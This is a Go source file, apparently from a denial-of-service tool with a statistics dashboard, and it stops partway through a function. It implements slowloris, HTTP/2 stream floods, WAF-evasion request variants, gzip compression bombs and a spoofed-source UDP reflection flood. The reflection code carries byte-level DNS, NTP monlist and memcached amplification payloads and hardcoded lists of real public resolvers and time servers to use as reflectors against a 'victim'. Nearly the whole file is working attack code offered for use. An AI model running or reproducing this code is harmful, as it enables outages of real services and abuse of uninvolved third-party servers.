package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/tls"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	mathrand "math/rand"
	"net"
	"net/http"
	"net/url"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	"golang.org/x/time/rate"
)

type logEmitter interface {
	Warning(string)
	Info(string)
}

var (
	reflectionFallbackWarningOnce sync.Once
	directFloodInfoOnce           sync.Once
)

func logReflectionFallbackWarning(logger logEmitter) {
	reflectionFallbackWarningOnce.Do(func() {
		if logger != nil {
			logger.Warning("udp reflection mode requested but raw sockets are unavailable (needs root/CAP_NET_RAW); falling back to the direct flood")
		}
	})
}

func logDirectFloodInfo(logger logEmitter, message string) {
	directFloodInfoOnce.Do(func() {
		if logger != nil {
			logger.Info(message)
		}
	})
}

// slowlorisAttack (type 1) — opens one TCP/TLS connection, sends the start of
// an HTTP request, then keeps the connection alive by dripping one extra header
// every 10 seconds. each held connection occupies one server thread or async
// handler slot. stacking enough of these across workers drains the pool before
// any request ever finishes.
func slowlorisAttack(ctx context.Context, target string, duration time.Duration) {
	parsed, err := url.Parse(target)
	if err != nil {
		failedRequests.Add(1)
		return
	}

	host := parsed.Host
	if !strings.Contains(host, ":") {
		if parsed.Scheme == "https" {
			host += ":443"
		} else {
			host += ":80"
		}
	}

	// https targets need a completed TLS handshake before we can send HTTP.
	// using net.Dial for https sends plaintext bytes where the server expects a
	// TLS ClientHello — the connection is dropped immediately and we hold nothing.
	// http/1.1 is forced here because h2 servers close streams that receive no
	// HEADERS frame after negotiation.
	var conn net.Conn
	if parsed.Scheme == "https" {
		tlsConn, tlsErr := tls.Dial("tcp", host, &tls.Config{
			InsecureSkipVerify: true, // stress-test environments often use self-signed certs
			NextProtos:         []string{"http/1.1"},
		})
		if tlsErr != nil {
			failedRequests.Add(1)
			return
		}
		conn = tlsConn
	} else {
		dialConn, dialErr := net.Dial("tcp", host)
		if dialErr != nil {
			failedRequests.Add(1)
			return
		}
		conn = dialConn
	}
	defer conn.Close()

	// Track active slowloris connection
	atomic.AddUint64(&slowlorisActive, 1)
	defer atomic.AddUint64(&slowlorisActive, ^uint64(0)) // Decrement when done

	// Send partial HTTP request and count bytes
	requestLine := "GET " + parsed.Path + " HTTP/1.1\r\n"
	hostHeader := "Host: " + parsed.Hostname() + "\r\n"
	userAgent := "User-Agent: " + realisticUserAgents[mathrand.Intn(len(realisticUserAgents))] + "\r\n"

	bytesSent := 0

	n, _ := conn.Write([]byte(requestLine))
	bytesSent += n

	n, _ = conn.Write([]byte(hostHeader))
	bytesSent += n

	n, _ = conn.Write([]byte(userAgent))
	bytesSent += n

	// Update latest request info for dashboard (no console spam)
	requestTrackingMux.Lock()
	lastRequestURL = target
	lastRequestSize = uint64(bytesSent)
	lastResponseSize = 0 // Slowloris doesn't get responses
	lastResponseCode = 0
	lastRequestProto = "SLOWLORIS"
	requestTrackingMux.Unlock()

	// Keep connection alive by sending headers slowly
	start := time.Now()
	headerCount := 0
	for time.Since(start) < duration {
		// Check if context is cancelled
		select {
		case <-ctx.Done():
			return
		default:
		}

		slowHeader := fmt.Sprintf("X-slowloris-%d: %d\r\n", headerCount, time.Now().Unix())
		n, err := conn.Write([]byte(slowHeader))
		if err != nil {
			// Update tracking when connection breaks
			requestTrackingMux.Lock()
			lastRequestURL = target
			lastRequestSize = uint64(bytesSent)
			lastResponseSize = 0
			lastResponseCode = 0
			lastRequestProto = "SLOWLORIS-BROKEN"
			requestTrackingMux.Unlock()
			break
		}
		bytesSent += n
		headerCount++

		// Update tracking every 10 headers to show ongoing activity
		if headerCount%10 == 0 {
			requestTrackingMux.Lock()
			lastRequestURL = target
			lastRequestSize = uint64(bytesSent)
			lastResponseSize = 0
			lastResponseCode = 0
			lastRequestProto = fmt.Sprintf("SLOWLORIS-%d", headerCount)
			requestTrackingMux.Unlock()
		}

		// Context-aware sleep that can be interrupted
		select {
		case <-ctx.Done():
			return
		case <-time.After(time.Second * 10):
			// Continue if not cancelled
		}
	}

	// Count total bytes sent for this connection
	atomic.AddUint64(&totalBytesSent, uint64(bytesSent))

	// Final update for tracking
	requestTrackingMux.Lock()
	lastRequestURL = target
	lastRequestSize = uint64(bytesSent)
	lastResponseSize = 0
	lastResponseCode = 0
	lastRequestProto = "SLOWLORIS-DONE"
	requestTrackingMux.Unlock()

	// Slowloris connections don't count as "successful hits" since they don't complete
	// But we can track them as a special metric
}

// h2ConnFanout is how many independent h2 connections the flood spreads its
// streams across. one shared socket means the server can kill the whole flood with
// a single GOAWAY/RST or stall it with per-connection backpressure (the README's
// documented caveat for type 2). a handful of connections makes that far less likely
// while still keeping each connection densely multiplexed.
const h2ConnFanout = 4

var (
	// h2FloodOnce ensures the persistent h2 client pool is initialized exactly once.
	// creating a new transport per call tears down and re-creates the TCP+TLS
	// connection for every 100-stream batch, which turns HTTP/2 flood into an
	// expensive HTTP/1.1 flood with extra handshake overhead. building the pool
	// once keeps each underlying h2 connection alive so batches multiplex over them.
	h2FloodOnce sync.Once
	h2FloodPool []*http.Client
)

// getH2ClientPool returns a fixed pool of HTTP/2 clients, each with its own
// transport so each rides a separate TCP+TLS connection. spreading the 100 streams
// across the pool means no single connection-level event (RST_STREAM, GOAWAY,
// flow-control backpressure) can stall the entire flood. the transports are
// long-lived so we keep the multiplexing pressure up rather than re-handshaking.
func getH2ClientPool() []*http.Client {
	h2FloodOnce.Do(func() {
		// flag-configurable fan-out, falling back to the default
		n := config.HTTP2Connections
		if n <= 0 {
			n = h2ConnFanout
		}
		h2FloodPool = make([]*http.Client, n)
		for i := range h2FloodPool {
			transport := &http.Transport{
				MaxIdleConns:        0,
				MaxIdleConnsPerHost: 0,
				MaxConnsPerHost:     0,
				IdleConnTimeout:     90 * time.Second,
				TLSClientConfig: &tls.Config{
					NextProtos:         []string{"h2", "http/1.1"},
					InsecureSkipVerify: true,
				},
				ForceAttemptHTTP2: true,
			}
			h2FloodPool[i] = &http.Client{
				Transport: transport,
				Timeout:   30 * time.Second,
			}
		}
	})
	return h2FloodPool
}

// http2FloodAttack (type 2) — fires 100 concurrent streams, spread across a small
// pool of persistent HTTP/2 connections. HTTP/2 multiplexes streams over each TCP
// socket so the server must manage many logical in-flight requests per fd. fanning
// out across a few connections (instead of one) keeps the pressure up even if the
// server resets or throttles an individual connection.
func http2FloodAttack(target string, client *http.Client) {
	pool := getH2ClientPool()

	var wg sync.WaitGroup
	for i := 0; i < 100; i++ {
		wg.Add(1)
		go func(streamIdx int) {
			defer wg.Done()

			// round-robin each stream onto one of the pooled connections
			h2Client := pool[streamIdx%len(pool)]

			// Create and send request
			req, err := http.NewRequest("GET", target, nil)
			if err != nil {
				failedRequests.Add(1)
				return
			}

			// Add realistic headers
			req.Header.Set("User-Agent", realisticUserAgents[mathrand.Intn(len(realisticUserAgents))])
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
			req.Header.Set("Accept-Language", "en-US,en;q=0.5")
			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
			req.Header.Set("Connection", "keep-alive")

			// Add anonymization headers
			addAnonymizationHeaders(req)

			startTime := time.Now()
			resp, err := h2Client.Do(req)
			elapsed := time.Since(startTime)
			if err != nil {
				failedRequests.Add(1)
				demonStats.record(HTTP2_FLOOD, elapsed.Milliseconds(), false)
				return
			}
			defer resp.Body.Close()

			// Read response and count bytes
			responseData, _ := io.ReadAll(resp.Body)
			requestBytes := calculateRequestSize(req)
			atomic.AddUint64(&totalBytesSent, uint64(requestBytes))

			// 4xx = blocked/rejected (not a real hit); 2xx/3xx/5xx all reached the
			// server, with 5xx often meaning we induced an error — count those as
			// hits. record latency so type 2 shows up in the per-type breakdown.
			success := resp.StatusCode < 400 || resp.StatusCode >= 500
			if success {
				atomic.AddUint64(&successfulHits, 1)
			} else {
				failedRequests.Add(1)
			}
			demonStats.record(HTTP2_FLOOD, elapsed.Milliseconds(), success)

			// Update latest request info for dashboard (no console spam)
			requestTrackingMux.Lock()
			lastRequestURL = target
			lastRequestSize = uint64(requestBytes)
			lastResponseSize = uint64(len(responseData))
			lastResponseCode = uint64(resp.StatusCode)
			lastRequestProto = strings.ToUpper(req.Proto)
			requestTrackingMux.Unlock()
		}(i)
	}
	wg.Wait()
}

// CacheBustingAttack bypasses CDN/cache layers
func generateCacheBustingURL(baseURL string) string {
	parsed, err := url.Parse(baseURL)
	if err != nil {
		return baseURL
	}

	values := parsed.Query()

	// Add multiple cache busting parameters
	param := cacheBustParams[mathrand.Intn(len(cacheBustParams))]
	values.Set(param, fmt.Sprintf("%d", time.Now().UnixNano()))

	// Add random parameters
	values.Set("rand", strconv.Itoa(mathrand.Intn(999999)))
	values.Set("_t", strconv.FormatInt(time.Now().Unix(), 10))

	parsed.RawQuery = values.Encode()
	return parsed.String()
}

// APIFuzzingAttack tests API endpoints with various payloads - CONCURRENT VERSION
func apiFuzzingAttack(baseURL string, client *http.Client) {
	// Send multiple concurrent API requests
	var wg sync.WaitGroup
	for i := 0; i < 50; i++ { // 50 concurrent API requests
		wg.Add(1)
		go func() {
			defer wg.Done()

			endpoint := commonAPIEndpoints[mathrand.Intn(len(commonAPIEndpoints))]
			target := strings.TrimRight(baseURL, "/") + endpoint

			// Different payload types for API fuzzing
			payloads := []interface{}{
				map[string]interface{}{"test": "value", "id": mathrand.Intn(10000)},
				[]int{1, 2, 3, 4, 5},
				strings.Repeat("A", 10000), // Large string
				map[string]interface{}{"nested": map[string]interface{}{"deep": "value"}},
				nil,
				"", // Empty payload
			}

			payload := payloads[mathrand.Intn(len(payloads))]
			var body io.Reader
			if payload != nil {
				jsonData, _ := json.Marshal(payload)
				body = bytes.NewReader(jsonData)
			}

			req, err := http.NewRequest(httpMethods[mathrand.Intn(len(httpMethods))], target, body)
			if err != nil {
				failedRequests.Add(1)
				return
			}

			// Add API-specific headers
			req.Header.Set("Content-Type", "application/json")
			req.Header.Set("Accept", "application/json, text/plain, */*")
			req.Header.Set("X-Requested-With", "XMLHttpRequest")
			req.Header.Set("User-Agent", realisticUserAgents[mathrand.Intn(len(realisticUserAgents))])

			resp, err := client.Do(req)
			if err != nil {
				failedRequests.Add(1)
				return
			}
			defer resp.Body.Close()

			// Read response and count bytes
			responseData, _ := io.ReadAll(resp.Body)
			requestBytes := calculateRequestSize(req)
			atomic.AddUint64(&totalBytesSent, uint64(requestBytes))
			atomic.AddUint64(&successfulHits, 1)

			// Update latest request info for dashboard (no console spam)
			requestTrackingMux.Lock()
			lastRequestURL = target
			lastRequestSize = uint64(requestBytes)
			lastResponseSize = uint64(len(responseData))
			lastResponseCode = uint64(resp.StatusCode)
			lastRequestProto = "API"
			requestTrackingMux.Unlock()
		}()
	}
	wg.Wait()
}

// wafBypassAttack (type 5) — sends structurally varied requests so that WAF
// signature rules fire on only a fraction of them. header case-manipulation and
// fake IP headers don't defeat modern WAFs because HTTP is case-insensitive for
// headers and trusted proxies strip X-Forwarded-For. structural variation is what
// actually works: different URL encodings, body format switching, parameter
// pollution, and path normalization tricks each require separate WAF rules.
func wafBypassAttack(target string, client *http.Client) {
	var wg sync.WaitGroup
	for i := 0; i < 75; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			bypassTarget, method, body, contentType := wafBypassVariant(target)

			var bodyReader io.Reader
			if body != "" {
				bodyReader = strings.NewReader(body)
			}

			req, err := http.NewRequest(method, bypassTarget, bodyReader)
			if err != nil {
				failedRequests.Add(1)
				return
			}
			if contentType != "" {
				req.Header.Set("Content-Type", contentType)
			}
			req.Header.Set("User-Agent", realisticUserAgents[mathrand.Intn(len(realisticUserAgents))])
			req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")

			resp, err := client.Do(req)
			if err != nil {
				failedRequests.Add(1)
				return
			}
			defer resp.Body.Close()
			responseData, _ := io.ReadAll(resp.Body)
			requestBytes := calculateRequestSize(req)
			atomic.AddUint64(&totalBytesSent, uint64(requestBytes))
			atomic.AddUint64(&successfulHits, 1)

			requestTrackingMux.Lock()
			lastRequestURL = bypassTarget
			lastRequestSize = uint64(requestBytes)
			lastResponseSize = uint64(len(responseData))
			lastResponseCode = uint64(resp.StatusCode)
			lastRequestProto = "WAF"
			requestTrackingMux.Unlock()
		}()
	}
	wg.Wait()
}

// wafBypassVariant returns one of six structurally distinct request shapes.
// each variant exploits a different gap in how WAF rule sets are written:
// they typically match one specific combination of method, path encoding, and
// body format, so mixing variants means any single rule covers only ~1/6 of
// the traffic.
func wafBypassVariant(target string) (bypassTarget, method, body, contentType string) {
	parsed, err := url.Parse(target)
	if err != nil {
		return target, "GET", "", ""
	}

	switch mathrand.Intn(6) {
	case 0:
		// URL-encoded path: same resource, different byte representation.
		// rules that pattern-match on literal "/" in the path skip this.
		q := parsed.Query()
		q.Set(fmt.Sprintf("v%d", mathrand.Intn(9999)), "1")
		parsed.RawQuery = q.Encode()
		encoded := strings.ReplaceAll(parsed.Path, "/", "%2F")
		parsed.Path = ""
		parsed.RawPath = encoded
		return parsed.String(), "GET", "", ""
	case 1:
		// HTTP parameter pollution: duplicate key with differing values.
		// WAFs that only inspect the first occurrence miss the second value;
		// servers that read the last occurrence get the second value.
		q := parsed.Query()
		key := fmt.Sprintf("p%d", mathrand.Intn(100))
		q.Add(key, "normal")
		q.Add(key, strings.Repeat("x", 256))
		parsed.RawQuery = q.Encode()
		return parsed.String(), "GET", "", ""
	case 2:
		// content-type mismatch: JSON body with form content-type.
		// rules keyed on content-type will apply form-parsing logic and miss
		// the JSON structure entirely.
		b := fmt.Sprintf(`{"id":%d,"q":"%s"}`, mathrand.Intn(10000),
			strings.Repeat("a", mathrand.Intn(512)+64))
		return target, "POST", b, "application/x-www-form-urlencoded"
	case 3:
		// overloaded query string: many dummy params before the real ones.
		// WAFs with a query-parsing budget stop after N params; the actual
		// payload params come after the junk and may not be inspected.
		q := parsed.Query()
		for k := 0; k < 20; k++ {
			q.Set(fmt.Sprintf("junk%d", k), fmt.Sprintf("%d", mathrand.Intn(99999)))
		}
		parsed.RawQuery = q.Encode()
		return parsed.String(), "GET", "", ""
	case 4:
		// path traversal that normalizes to the target path.
		// the WAF sees the literal traversal sequence; the server resolves it.
		path := parsed.Path
		if path == "" || path == "/" {
			path = "/"
		}
		parsed.Path = "/./" + strings.TrimPrefix(path, "/")
		return parsed.String(), "GET", "", ""
	default:
		// JSON POST body: triggers a different inspection pipeline than GET,
		// and the random size prevents easy body-length fingerprinting.
		b := fmt.Sprintf(`{"t":%d,"data":"%s"}`, time.Now().UnixNano(),
			strings.Repeat("b", mathrand.Intn(1024)+64))
		return target, "POST", b, "application/json"
	}
}

// compressionBombAttack (type 7) — sends a real gzip-compressed body that
// decompresses to ~64MB on the server side. zeros compress at roughly 1000:1, so
// the wire payload is small (~64KB) but forces the server to allocate 64MB of
// decompression buffer per request. the previous code sent uncompressed zeros with
// a lying Content-Encoding header, which servers correctly rejected with 400.
func compressionBombAttack(target string, client *http.Client) {
	// flag-configurable decompressed size, falling back to 64MB
	bombSize := config.BombSizeBytes
	if bombSize <= 0 {
		bombSize = 64 * 1024 * 1024
	}
	bomb, err := makeGzipBomb(bombSize)
	if err != nil {
		failedRequests.Add(1)
		return
	}

	var wg sync.WaitGroup
	for i := 0; i < 25; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			req, err := http.NewRequest("POST", target, bytes.NewReader(bomb))
			if err != nil {
				failedRequests.Add(1)
				return
			}
			req.Header.Set("Content-Type", "application/octet-stream")
			req.Header.Set("Content-Encoding", "gzip")
			req.Header.Set("Accept-Encoding", "gzip, deflate, br")
			req.Header.Set("User-Agent", realisticUserAgents[mathrand.Intn(len(realisticUserAgents))])

			startTime := time.Now()
			resp, err := client.Do(req)
			elapsed := time.Since(startTime)
			if err != nil {
				failedRequests.Add(1)
				demonStats.record(BANDWIDTH_SATURATION, elapsed.Milliseconds(), false)
				return
			}
			defer resp.Body.Close()
			responseData, _ := io.ReadAll(resp.Body)
			requestBytes := calculateRequestSize(req)
			atomic.AddUint64(&totalBytesSent, uint64(requestBytes))

			// landing signal: 413 (Payload Too Large), 431 (headers too large), or
			// 400 (bad request) means a proxy/server rejected the body on size or
			// format before any decompression happened — the bomb did not land.
			// any other status means the body was at least accepted into the
			// pipeline (and on a stack without a decompression size limit, expanded
			// into the full 64MB buffer). this is the only externally observable
			// proxy we have for whether the attack actually cost the server anything.
			if resp.StatusCode == 413 || resp.StatusCode == 431 || resp.StatusCode == 400 {
				atomic.AddUint64(&compressionRejected, 1)
			} else {
				atomic.AddUint64(&compressionAccepted, 1)
			}

			// count a 4xx as a non-success in the histogram even though the request
			// completed — previously every bomb counted as a "successful hit"
			// regardless of whether it was rejected, which inflated the numbers.
			success := resp.StatusCode < 400
			if success {
				atomic.AddUint64(&successfulHits, 1)
			} else {
				failedRequests.Add(1)
			}
			demonStats.record(BANDWIDTH_SATURATION, elapsed.Milliseconds(), success)

			requestTrackingMux.Lock()
			lastRequestURL = target
			lastRequestSize = uint64(requestBytes)
			lastResponseSize = uint64(len(responseData))
			lastResponseCode = uint64(resp.StatusCode)
			lastRequestProto = "BOMB"
			requestTrackingMux.Unlock()
		}()
	}
	wg.Wait()
}

// makeGzipBomb builds a valid gzip stream whose decompressed size is
// decompressedBytes. null bytes compress at roughly 1000:1 with best-compression,
// so a 64MB bomb is typically under 100KB on the wire.
func makeGzipBomb(decompressedBytes int) ([]byte, error) {
	var buf bytes.Buffer
	gz, err := gzip.NewWriterLevel(&buf, gzip.BestCompression)
	if err != nil {
		return nil, err
	}
	chunk := make([]byte, 32*1024)
	remaining := decompressedBytes
	for remaining > 0 {
		n := remaining
		if n > len(chunk) {
			n = len(chunk)
		}
		if _, werr := gz.Write(chunk[:n]); werr != nil {
			return nil, werr
		}
		remaining -= n
	}
	if cerr := gz.Close(); cerr != nil {
		return nil, cerr
	}
	return buf.Bytes(), nil
}

// udpFloodAttack is the dispatcher for type 10. it attempts a raw socket
// spoofed flood first (requires root or CAP_NET_RAW). if the raw socket open
// fails — permission denied, unsupported platform — it falls back to a direct
// dual-mode flood with real source IPs.
//
// when no explicit port is given, addresses are resolved across several common
// UDP service ports so a single dst_port firewall rule can't kill everything.
func udpFloodAttack(ctx context.Context, target string, config *AttackConfig) {
	// bound concurrent invocations. the raw-socket reflection path spawns ~150
	// goroutines per call, each doing a blocking raw syscall.Sendto that pins an OS
	// thread; at high -concurrency that multiplied into tens of thousands of threads
	// and crashed the runtime ("failed to create new OS thread"). non-blocking: when
	// we're already at the cap we skip this invocation rather than stalling the
	// worker, we're at send capacity anyway, and UDP output is uplink-bound. this
	// guards the operator's own process and does not change what each invocation sends.
	select {
	case udpFloodSlots <- struct{}{}:
		defer func() { <-udpFloodSlots }()
	default:
		return
	}

	host, port, portExplicit, err := parseTargetForUDP(target)
	if err != nil {
		fmt.Printf("[err] udp flood: %v\n", err)
		failedRequests.Add(1)
		return
	}

	// reflection/amplification is an explicit, opt-in attack mode (-udp-reflection);
	// the default is the direct, non-spoofed flood against the real service port.
	// -udp-direct is kept as an explicit force-direct and overrides -udp-reflection.
	reflectionMode := globalDemonConfig != nil && globalDemonConfig.UDPReflection && !globalDemonConfig.UDPDirect
	var targetPorts []string
	switch {
	case portExplicit:
		targetPorts = []string{port}
	case reflectionMode:
		// reflection mode with no explicit port: fan out across the service ports its
		// vectors target (unchanged behavior for that mode).
		targetPorts = []string{"17", "19", "53", "80", "123", "443", "1900", "5353", "11211"}
	default:
		// direct/measured default: the real service port only. spraying ports is an
		// attack pattern and just splits the generator's effort across ports nothing is
		// listening on, undercounting what the real port can actually take.
		targetPorts = []string{port} // port defaults to "80" from parseTargetForUDP
		if globalLogger != nil {
			globalLogger.Warning(fmt.Sprintf("udp: no port in target; defaulting to :%s — pass the real service port (e.g. host:9999) to measure it accurately", port))
		}
	}

	var addrs []*net.UDPAddr
	for _, p := range targetPorts {
		a, resolveErr := net.ResolveUDPAddr("udp", net.JoinHostPort(host, p))
		if resolveErr == nil {
			addrs = append(addrs, a)
		}
	}
	if len(addrs) == 0 {
		fmt.Printf("[err] udp flood: could not resolve any target address\n")
		failedRequests.Add(1)
		return
	}

	// Publish live-activity info BEFORE the (blocking) flood starts, so the
	// dashboard reflects the UDP run for its whole duration instead of flashing
	// fabricated values for a single frame at the end. UDP has no HTTP status or
	// response body, so those are zero (not a fake 200); the real volume shows up in
	// the bytes-sent counter. lastRequestSize is the near-MTU packet size we actually
	// fire on the byte-throughput stream.
	requestTrackingMux.Lock()
	lastRequestURL = fmt.Sprintf("udp://%s:%s", host, targetPorts[0])
	lastRequestSize = udpBpsPayloadBytes
	lastResponseSize = 0
	lastResponseCode = 0
	lastRequestProto = "UDP"
	requestTrackingMux.Unlock()

	// reflection/amplification runs ONLY when explicitly selected (-udp-reflection)
	// and not overridden by -udp-direct. otherwise the default is the direct,
	// non-spoofed flood against the target. if reflection is requested but raw
	// sockets can't open (no root / unsupported platform), say so and fall back to
	// direct so the run still does something.
	if reflectionMode {
		if !reflectionUDPFlood(ctx, addrs) {
			logReflectionFallbackWarning(globalLogger)
			directUDPFlood(ctx, addrs)
		}
	} else {
		directUDPFlood(ctx, addrs)
	}
}

// reflectionUDPFlood performs multi-protocol UDP amplification. it spoofs the
// source IP as the target's IP and sends small requests to amplifier servers;
// those servers send much larger responses directly to the victim.
//
// six protocol vectors run simultaneously, each assigned to a goroutine slice:
//
//	DNS EDNS0 (port 53): queries "." IN NS with a 4096-byte EDNS0 buffer and
//	the DNSSEC-OK bit set. NS responses with DNSSEC records are 500-800 bytes
//	against a ~30-byte query, roughly 20-28x. NS/DNSKEY queries are not
//	subject to RFC 8482 (which only limits ANY responses), so these still work
//	against patched resolvers.
//
//	NTP monlist (port 123): Mode 7 REQ_MON_GETLIST_1. unpatched ntpd instances
//	respond with up to 100 UDP packets listing every client they have served,
//	up to 556x amplification.
//
//	memcached stats (port 11211): a 15-byte UDP stats command returns the full
//	stats output, typically 10-100KB, up to 50,000x amplification.
//
//	SSDP M-SEARCH (port 1900): triggers UPnP device description XML responses.
//	only active when udpSSDPAmplifiers is populated via -ssdp-amplifiers.
//
//	CHARGEN (port 19): sends a short request to a public CHARGEN reflector and
//	gets back a stream of ASCII characters that makes the packet flood look much
//	more substantial on the victim side than the tiny request size suggests.
//
//	QOTD (port 17): asks a public quote-of-the-day server for a line of text.
//	its response is short but it is another real UDP reflection vector when the
//	reflector inventory is populated via -qotd-amplifiers or discovery.
//
// requires root or CAP_NET_RAW. returns false if the socket cannot be opened so
// the caller falls back to directUDPFlood without any error noise.
func reflectionUDPFlood(ctx context.Context, addrs []*net.UDPAddr) bool {
	// open one raw socket per logical CPU rather than one shared socket.
	// the kernel serializes concurrent Sendto calls on a single raw fd, so
	// sharing across 120 goroutines creates a single kernel-side bottleneck.
	// one fd per core lets the kernel pipeline sends across multiple CPU queues.
	numSockets := runtime.NumCPU()
	if numSockets < 2 {
		numSockets = 2
	}
	sockets := make([]int, numSockets)
	for i := range sockets {
		fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
		if err != nil {
			for j := 0; j < i; j++ {
				syscall.Close(sockets[j])
			}
			return false
		}
		if err := syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1); err != nil {
			syscall.Close(fd)
			for j := 0; j < i; j++ {
				syscall.Close(sockets[j])
			}
			return false
		}
		sockets[i] = fd
	}
	defer func() {
		for _, fd := range sockets {
			syscall.Close(fd)
		}
	}()

	// bwLimiter is always non-nil (main.go installs it unconditionally). using
	// the pointer directly means adaptiveCongestionControl's SetLimit calls are
	// visible to every goroutine here immediately — no snapshot, no copy.
	paceLimiter := bwLimiter

	// DNS EDNS0: "." IN NS with DO bit set. elicits a DNSSEC-signed NS response
	// (~600 bytes) against a 30-byte query, roughly 20-28×. NS queries are not
	// subject to RFC 8482 (which only restricts ANY responses), so patched
	// resolvers still respond with full signed authority sections.
	dnsPayload := []byte{
		0x00, 0x00, // Transaction ID, randomized per packet
		0x01, 0x00, // Flags: QR=0 (query), RD=1
		0x00, 0x01, // QDCOUNT: 1
		0x00, 0x00, // ANCOUNT: 0
		0x00, 0x00, // NSCOUNT: 0
		0x00, 0x01, // ARCOUNT: 1 (OPT)
		// QNAME: "." (root)
		0x00,
		0x00, 0x02, // QTYPE: NS
		0x00, 0x01, // QCLASS: IN
		// OPT record (EDNS0)
		0x00,       // name: root
		0x00, 0x29, // type: OPT (41)
		0x10, 0x00, // UDP payload size: 4096
		0x00,       // extended RCODE: 0
		0x00,       // EDNS version: 0
		0x80, 0x00, // Z/flags: DO=1 (DNSSEC OK), triggers signed response
		0x00, 0x00, // RDLENGTH: 0
	}

	// NTP Mode 7 REQ_MON_GETLIST_1 (0x2a = 42): 48-byte private request.
	// unpatched ntpd replies with up to 100 packets of 440 bytes each,
	// listing every IP that has queried the server, up to 556× amplification.
	ntpPayload := []byte{
		0x17, 0x00, 0x03, 0x2a,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	}

	// memcached UDP: 8-byte framing header + ASCII "stats\r\n".
	// request ID at bytes 0-1 is randomized per packet.
	memcachedPayload := []byte{
		0x00, 0x01, // request ID, randomized per packet
		0x00, 0x00, // sequence number
		0x00, 0x01, // total datagrams
		0x00, 0x00, // reserved
		's', 't', 'a', 't', 's', '\r', '\n',
	}

	// SSDP M-SEARCH: UPnP devices send their full description XML in response.
	ssdpPayload := []byte("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n")

	// CHARGEN and QOTD are short, real UDP services that still produce a
	// measurable response stream when a reflector inventory is present.
	chargenPayload := []byte("\n")
	qotdPayload := []byte("\n")

	// DNS amplifiers: less-monitored open resolvers that have not fully
	// implemented RFC 8482 rate limits and still respond to NS+EDNS0 queries
	// at volume. the major providers (Google, Cloudflare, Quad9) are excluded
	// because they apply per-source rate limits within the first ~100 packets.
	dnsAmplifiers := []net.IP{
		net.ParseIP("80.80.80.80").To4(),     // Freenom DNS
		net.ParseIP("80.80.81.81").To4(),     // Freenom DNS
		net.ParseIP("77.88.8.8").To4(),       // Yandex DNS
		net.ParseIP("77.88.8.1").To4(),       // Yandex DNS
		net.ParseIP("114.114.114.114").To4(), // 114DNS
		net.ParseIP("114.114.115.115").To4(), // 114DNS
		net.ParseIP("119.29.29.29").To4(),    // DNSPod
		net.ParseIP("180.76.76.76").To4(),    // Baidu DNS
		net.ParseIP("101.101.101.101").To4(), // Quad101 (Taiwan)
		net.ParseIP("76.76.19.19").To4(),     // Alternate DNS
		net.ParseIP("76.223.100.101").To4(),  // Alternate DNS
		net.ParseIP("185.228.168.9").To4(),   // CleanBrowsing
		net.ParseIP("74.82.42.42").To4(),     // Hurricane Electric
		net.ParseIP("156.154.70.1").To4(),    // Neustar (Verisign)
		net.ParseIP("156.154.71.1").To4(),    // Neustar (Verisign)
		net.ParseIP("1.2.4.8").To4(),         // CNNIC SDNS
		net.ParseIP("210.2.4.8").To4(),       // CNNIC SDNS
		net.ParseIP("223.5.5.5").To4(),       // AliDNS
		net.ParseIP("223.6.6.6").To4(),       // AliDNS
		net.ParseIP("117.50.10.10").To4(),    // OneDNS
		net.ParseIP("117.50.11.11").To4(),    // OneDNS
		net.ParseIP("52.58.31.114").To4(),    // SafeSurfer
		net.ParseIP("109.69.8.51").To4(),     // puntCAT
		net.ParseIP("84.200.69.80").To4(),    // DNS.WATCH
		net.ParseIP("84.200.70.40").To4(),    // DNS.WATCH
	}

	// NTP amplifiers: stratum-2/3 servers with historically slower patch cycles
	// for CVE-2013-5211. excludes Google, Apple, NIST, and Microsoft — all of
	// those rate-limit monlist requests within the first few packets.
	ntpAmplifiers := []net.IP{
		net.ParseIP("195.13.1.152").To4(),    // stratum-2
		net.ParseIP("193.204.114.232").To4(), // INRIM (Italy)
		net.ParseIP("130.149.17.21").To4(),   // PTB (Germany)
		net.ParseIP("91.189.94.4").To4(),     // Ubuntu NTP
		net.ParseIP("91.189.91.157").To4(),   // Ubuntu NTP alt
		net.ParseIP("5.135.84.61").To4(),     // OVH stratum-2
		net.ParseIP("194.57.169.1").To4(),    // French academic
		net.ParseIP("193.67.79.202").To4(),   // RIPE NCC
		net.ParseIP("195.148.127.1").To4(),   // stratum-2
		net.ParseIP("216.171.112.36").To4(),  // stratum-2
		net.ParseIP("45.32.230.95").To4(),    // community stratum-2
		net.ParseIP("195.82.148.130").To4(),  // European stratum-2
		net.ParseIP("46.28.200.132").To4(),   // European stratum-2
		net.ParseIP("185.255.55.20").To4(),   // stratum-2
	}

	// the reflection path now prefers explicit inventories loaded from files or
	// discovery runs; hardcoded legacy lists stay behind an explicit opt-in so
	// stale public amplifiers are not silently used as the default.
	effectiveDNS := []net.IP{}
	if useBuiltInReflectors {
		effectiveDNS = append([]net.IP(nil), dnsAmplifiers...)
	}
	if len(udpDNSAmplifiers) > 0 {
		effectiveDNS = append([]net.IP(nil), udpDNSAmplifiers...)
	}

	effectiveNTP := []net.IP{}
	if useBuiltInReflectors {
		effectiveNTP = append([]net.IP(nil), ntpAmplifiers...)
	}
